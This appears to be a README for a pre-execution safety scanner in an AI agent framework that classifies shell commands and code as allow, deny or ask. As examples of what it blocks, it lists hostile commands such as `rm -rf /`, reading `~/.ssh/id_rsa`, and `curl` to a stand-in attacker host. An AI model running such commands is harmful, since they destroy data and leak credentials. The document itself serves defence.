# Tool Execution Safety Guard

The `tool/safety` package provides a pre-execution safety scanner for
tRPC-Agent-Go's tool execution layer.  It scans shell commands and
source code before execution, producing an `allow` / `deny` / `ask`
verdict based on a configurable policy.

## Why this exists

tRPC-Agent-Go's Tool, MCP Tool, Skill, and CodeExecutor capabilities
let agents execute scripts, call external commands, read/write files,
and access the network.  These capabilities are essential for
automation but introduce security risks:

- Destructive commands (`rm -rf /`)
- Credential theft (`cat ~/.ssh/id_rsa`)
- Data exfiltration (`curl https://evil.com`)
- Shell-wrapper bypass (`sh -c '...'`)
- Privilege escalation (`sudo ...`)
- Dependency installation (`pip install malicious-pkg`)
- Resource abuse (infinite loops, `/dev/zero`)
- Secret leakage (API keys in commands)

The Safety Guard addresses these risks by scanning commands **before**
execution and blocking or flagging high-risk operations.

## Relationship to existing security layers

The Safety Guard is **not a replacement** for sandbox isolation.  It is
an additional defense-in-depth layer that complements the existing
security mechanisms:

| Layer | Package | Responsibility |
|-------|---------|---------------|
| Structural validation | `internal/shellsafe` | Rejects shell features ($(), backticks, redirections) |
| Environment scrubbing | `internal/envscrub` | Strips dangerous env vars (PATH, LD_PRELOAD, ...) |
| OS-level isolation | `codeexecutor/sandbox` | Filesystem and network namespace isolation |
| **Semantic risk scan** | **`tool/safety`** | **Detects dangerous commands, paths, egress, secrets** |
| Permission policy | `tool.PermissionPolicy` | Framework hook for allow/deny/ask decisions |

The Safety Guard plugs into the `PermissionPolicy` extension point,
running after the tool's own `PermissionChecker` but before execution.

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│                   PermissionPolicy                      │
│  (tool/safety/permission.go — adapts Scanner to         │
│   tool.PermissionPolicy interface)                      │
└───────────────┬─────────────────────────────────────────┘
                │
                ▼
┌─────────────────────────────────────────────────────────┐
│                      Scanner                            │
│  (tool/safety/scanner.go — orchestrates the scan)       │
│                                                         │
│  1. shellsafe.Parse (structural validation)             │
│  2. shellsafe.Policy.Check (allow/deny list)            │
│  3. Run all Rules (semantic risk detection)             │
│  4. Compute verdict (deny > ask > allow)                │
└───────────────┬─────────────────────────────────────────┘
                │
        ┌───────┼───────┬───────┬───────┬───────┬───────┐
        ▼       ▼       ▼       ▼       ▼       ▼       ▼
     Rule 1  Rule 2  Rule 3  Rule 4  Rule 5  Rule 6  Rule 7
     Danger  Network Shell   HostDep  DepIns  Resrc   Sensitive
     Cmd     Egress  Bypass  Exec     tall    Abuse   Leak
                                                      + CodeExec
```

## Risk categories

| # | Rule ID | Risk | Default Level |
|---|---------|------|---------------|
| 1 | `dangerous_command` | `rm -rf`, forbidden paths, `/dev/zero` | critical/high |
| 2 | `network_egress` | Non-whitelisted network access | critical/high |
| 3 | `shell_bypass` | `sh -c`, `bash -c` wrappers | critical |
| 4 | `hostexec_risk` | hostexec review, background, privilege | medium/high |
| 5 | `dependency_install` | `pip install`, `npm install`, etc. | medium/high |
| 6 | `resource_abuse` | Infinite loops, `/dev/zero` | high |
| 7 | `sensitive_leak` | API keys, tokens, credentials in commands | high/critical |
| 8 | `code_exec_danger` | `os.system()`, `subprocess` in code | critical |

## Usage

### Basic usage

```go
import (
    "trpc.group/trpc-go/trpc-agent-go/tool/safety"
    "trpc.group/trpc-go/trpc-agent-go/agent"
)

// Create a permission policy from a config file.
policy, err := safety.NewPermissionPolicy(
    "tool_safety_policy.yaml",
    "tool_safety_audit.jsonl",
)
if err != nil {
    log.Fatal(err)
}

// Apply the policy as a per-invocation run option.
// agent.WithToolPermissionPolicy is a RunOption, not a New option.
runner.Run(ctx, role, sessionID, model.NewUserMessage("your message"),
    agent.WithToolPermissionPolicy(policy),
)
```

### Programmatic usage

```go
scanner, _ := safety.NewScanner(safety.DefaultPolicy())
report, _ := scanner.ScanCommand(ctx, &safety.ScanRequest{
    ToolName: "workspace_exec",
    Command:  "rm -rf /",
    Backend:  safety.BackendWorkspaceExec,
})
fmt.Println(report.Verdict) // "deny"
// report.Blocked has been removed; compare report.Verdict == safety.VerdictDeny
```

## Configuration

See `tool_safety_policy.yaml` for the full configuration reference.
The policy file can be modified without code changes to adjust:

- Allowed and denied commands
- Forbidden paths
- Network whitelist
- Resource limits
- Dependency manager policy
- Sensitive information patterns
- Per-backend overrides

## Audit and observability

Every scan produces:

1. **Structured report** (`ScanReport`) — contains the verdict, risk
   level, rule IDs, evidence, and recommendations.
2. **Audit log** (`tool_safety_audit.jsonl`) — one JSON line per scan,
   with redacted commands and timing information.
3. **OpenTelemetry span attributes** — `tool.safety.decision`,
   `tool.safety.risk_level`, `tool.safety.rule_id`,
   `tool.safety.backend`, `tool.safety.blocked`.  (The `decision` and
   `blocked` attribute names are kept stable as wire-level telemetry
   schema; the value of `blocked` is derived from
   `verdict == "deny"`.)

## Verdict logic

The scanner computes the final verdict as follows:

1. If any rule returns `ShouldBlock: true` → **deny**
2. If any rule returns `RiskHigh` or `RiskCritical` → **deny**
3. If any rule returns `RiskMedium` → **ask**
4. Otherwise → fall back to the policy's `default_verdict` (or
   **allow** when unset)

## Backend-specific behavior

- **workspaceexec**: Applies shellsafe structural validation + all
  semantic rules. Background processes are configurable.
- **hostexec**: Applies shellsafe + all semantic rules. Defaults to
  `RequireHumanReview: true` (all commands need approval).
- **codeexec**: Skips shellsafe (code is not shell). Uses the
  `code_exec_danger` rule to detect dangerous Python/bash patterns.

## Limitations

The Safety Guard is a **static, pre-execution** scanner.  It cannot:

- Detect risks that only manifest at runtime (e.g., a script that
  downloads and executes a payload in two steps).
- Replace sandbox isolation — a command that passes the scan can
  still cause damage if the sandbox is misconfigured.
- Analyze obfuscated code that hides its intent through indirection.

For production deployments, combine the Safety Guard with sandbox
isolation, network policies, and runtime monitoring.
